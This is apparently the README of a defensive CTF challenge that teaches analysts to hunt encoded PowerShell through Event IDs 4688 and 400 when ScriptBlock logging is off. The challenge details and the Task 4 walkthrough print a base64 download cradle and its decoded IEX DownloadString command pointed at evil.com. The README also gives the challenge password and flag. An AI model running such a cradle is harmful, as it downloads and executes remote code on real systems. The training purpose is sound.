# ⚡ Hunt for PowerShell Without Logging - CTF Challenge

## 📋 Overview

**Hunt for PowerShell Without Logging** is an interactive, browser-based Capture The Flag (CTF) challenge designed for cybersecurity training. This challenge focuses on detecting malicious PowerShell activity when ScriptBlock logging (Event 4104) is disabled. Participants learn alternative detection methods using Event ID 4688 (Process Creation) and Event 400 (PowerShell Engine Start) to identify suspicious encoded commands and respond to logging gaps.

## 🎯 Learning Objectives

By completing this CTF, participants will learn:

- **Registry Analysis**: Identify the registry key controlling PowerShell ScriptBlock logging
- **Alternative Detection**: Use Event IDs 4688 and 400 when 4104 is unavailable
- **Command Analysis**: Identify suspicious encoded PowerShell commands
- **Base64 Decoding**: Understand how attackers obfuscate malicious commands
- **GPO Remediation**: Enable proper PowerShell logging through Group Policy
- **Blind Spot Awareness**: Recognize attacker advantages when logging is disabled

## 🛠️ Challenge Tasks (5 Total)

| Task | Description | Skill Focus |
|------|-------------|-------------|
| **Task 1** | Identify registry key controlling ScriptBlock logging | Registry Analysis |
| **Task 2** | Select alternative Event IDs (4688, 400) | Event Log Knowledge |
| **Task 3** | Find suspicious encoded PowerShell command | Command Analysis |
| **Task 4** | Decode the base64 encoded command | Malware Analysis |
| **Task 5** | Recommend GPO fix to enable logging | Remediation |

## 🚀 Quick Start

### Prerequisites
- A modern web browser (Chrome, Firefox, Edge, Safari)
- No server required - runs entirely in the browser
- No installation needed

### Access the Challenge
1. Open the HTML file directly in your browser
2. Enter your name
3. Use the password: `45_2026`
4. Complete all 5 tasks to capture the flag

### Hosting on GitHub Pages
1. Fork or clone this repository
2. Go to repository Settings > Pages
3. Select the branch (usually `main`) and save
4. Access via `https://your-username.github.io/repository-name`

## 🎮 How to Play

### Login
```
Password: 45_2026
Name: Enter any name (progress is saved locally)
```

### Game Features

- **Toggle View**: Switch between "Disabled" and "Enabled" ScriptBlock logging views
- **Registry Key Display**: Visual representation of the EnableScriptBlockLogging value
- **Event 4688 Logs**: Simulated process creation logs with encoded commands
- **Decoder Simulation**: Base64 encoded command with decoded output
- **Event ID Selection**: Interactive checkbox selection for alternative event IDs
- **GPO Reference**: Group Policy path for enabling ScriptBlock logging
- **Answer Validation**: Immediate feedback on submitted answers
- **Progress Tracking**: Local storage saves your progress across sessions

### Completing Tasks
1. Read each task description carefully
2. Toggle between logging enabled/disabled to understand the difference
3. Analyze the process creation logs
4. Review the encoded and decoded command examples
5. Type your answer in the input field
6. Click "Submit" to validate
7. Complete all 5 tasks to reveal the flag

## 🏆 Flag

```
FLAG{POWERSHELL_NO_LOGGING}
```

The flag is revealed only after completing all 5 tasks successfully.

## 📊 Challenge Details

### Registry Key Location

```
📁 HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
   EnableScriptBlockLogging = 0 (DISABLED)
```

### Event 4688 - Process Creation Logs

```
Event 4688: cmd.exe (PID: 4520) → whoami.exe
Event 4688: powershell.exe (PID: 5580) → powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0... ⚠️ ENCODED
Event 4688: powershell.exe (PID: 5590) → Get-Service
Event 400: PowerShell Engine started (PID: 5580)
Event 400: PowerShell Engine started (PID: 5590)
```

### Encoded Command

```
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA
```

### Decoded Command

```
IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.exe')
```

### Alternative Event IDs

| Event ID | Description | Availability |
|----------|-------------|--------------|
| **4688** | Process Creation | ✅ Always Available |
| **400** | PowerShell Engine Start | ✅ Always Available |
| **4104** | ScriptBlock Logging | ❌ Disabled |

## 🔍 Investigation Walkthrough

### Task 1: Identify Registry Key
The registry value `EnableScriptBlockLogging = 0` controls PowerShell ScriptBlock logging. When set to 0:
- Event 4104 is not generated
- PowerShell commands are not logged in detail
- Attackers can execute malicious scripts with reduced visibility
- Analysts must rely on alternative event sources

### Task 2: Alternative Event IDs
When ScriptBlock logging is disabled, analysts should use:
- **Event 4688** (Process Creation): Captures the full command line including encoded commands
- **Event 400** (PowerShell Engine Start): Indicates PowerShell was launched with specific parameters

These events are always available regardless of ScriptBlock logging configuration.

### Task 3: Suspicious PowerShell Command
The encoded command is suspicious because:
- Uses `-enc` flag indicating base64 encoding
- Legitimate scripts rarely use encoded commands
- Encoding is used to obfuscate malicious intent
- The length of the encoded string suggests complex operations

### Task 4: Decode the Command
The decoded command `IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.exe')` reveals:
- **Download Malicious Payload**: Downloads and executes remote code
- Uses .NET WebClient for network access
- Invoke-Expression (IEX) executes downloaded content
- Fetches from suspicious external domain

### Task 5: GPO Remediation
Enable ScriptBlock logging via Group Policy:
```
Computer Configuration\Administrative Templates\Windows Components\Windows PowerShell\Turn on Script Block Logging = Enabled
```

This ensures:
- All PowerShell commands are logged in Event 4104
- Encoded commands are automatically decoded and logged
- Suspicious scripts are captured in detail
- Incident responders have full visibility

## 🎨 Visual Features

- **Toggle Switch**: Interactive ON/OFF toggle for ScriptBlock logging status
- **Color-coded Status**: Green for enabled (safe), Red for disabled (danger)
- **Registry Key Display**: Visual representation with color-coded values
- **Event Log Display**: Process creation logs with highlighted encoded commands
- **Decoder Box**: Side-by-side display of encoded and decoded commands
- **Checkbox Selection**: Interactive event ID selection interface
- **Progress Indicators**: Visual completion status for each task
- **Glowing Flag Animation**: Celebratory golden flag reveal
- **Toast Notifications**: Non-intrusive success/error messages
- **Dark Theme**: Green-accented UI for PowerShell theme

## 💾 Data Storage

- **Progress**: Saved in browser's `localStorage`
- **Persistence**: Progress survives page refreshes
- **Privacy**: All data stays on the user's device
- **Reset**: Clear browser data to reset progress

## 🛡️ PowerShell Detection Indicators

### When ScriptBlock Logging is Disabled:
- Monitor Event 4688 for PowerShell process creation
- Look for `-enc`, `-encodedcommand`, `-e` flags
- Check for base64 encoded strings in command lines
- Monitor Event 400 for PowerShell engine starts
- Correlate with network connections from PowerShell

### High-Fidelity Indicators:
- Encoded commands in PowerShell process creation
- Downloads from external URLs in PowerShell
- PowerShell executing from unusual parent processes
- Base64 strings exceeding 500 characters
- PowerShell with hidden window flags (`-w hidden`, `-windowstyle hidden`)

### Medium-Fidelity Indicators:
- PowerShell execution during non-business hours
- Unusual PowerShell command-line length
- Multiple PowerShell instances in short time
- PowerShell downloading from newly registered domains

## 📁 File Structure

```
hunt-powershell-no-logging/
│
├── index.html          # Main CTF challenge file
├── README.md           # This documentation
└── (no other files required)
```

## 🔧 Technical Implementation

- **Pure Frontend**: HTML5, CSS3, JavaScript (Vanilla)
- **No Dependencies**: Zero external libraries
- **Responsive Design**: Works on desktop and mobile
- **Animations**: CSS keyframe animations for toggle switch
- **Storage**: Browser localStorage API
- **Gamification**: Progress tracking, badge system, visual rewards
- **Interactive Elements**: Toggle switch, checkbox selection

## 📊 PowerShell Logging Configuration Guide

### Registry Locations
```
HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
├── EnableScriptBlockLogging (REG_DWORD)
├── EnableScriptBlockInvocationLogging (REG_DWORD)
└── EnableTranscripting (REG_DWORD)
```

### GPO Path
```
Computer Configuration
└── Administrative Templates
    └── Windows Components
        └── Windows PowerShell
            ├── Turn on Script Block Logging
            ├── Turn on Module Logging
            └── Turn on PowerShell Script Execution
```

## 🎓 Educational Use Cases

- **Cybersecurity Training Programs**
- **SOC Analyst Onboarding**
- **Threat Hunting Workshops**
- **Blue Team Exercises**
- **Malware Analysis Training**
- **Academic Courses** (Windows Security, PowerShell Security)
- **Self-paced Learning**
- **Incident Response Training**

## 🔄 Version History

- **v1.0** - Initial release
  - 5 tasks with validation
  - Interactive toggle switch for logging status
  - Simulated Event 4688 and 400 logs
  - Base64 decoder simulation
  - Local storage progress tracking
  - Student login system

## 👥 Target Audience

- Security Operations Center (SOC) Analysts
- Incident Response Team Members
- Threat Hunters
- Windows System Administrators
- Malware Analysts
- Cybersecurity Students
- IT Security Professionals
- Blue Team Practitioners

---

**Happy PowerShell Hunting! ⚡**
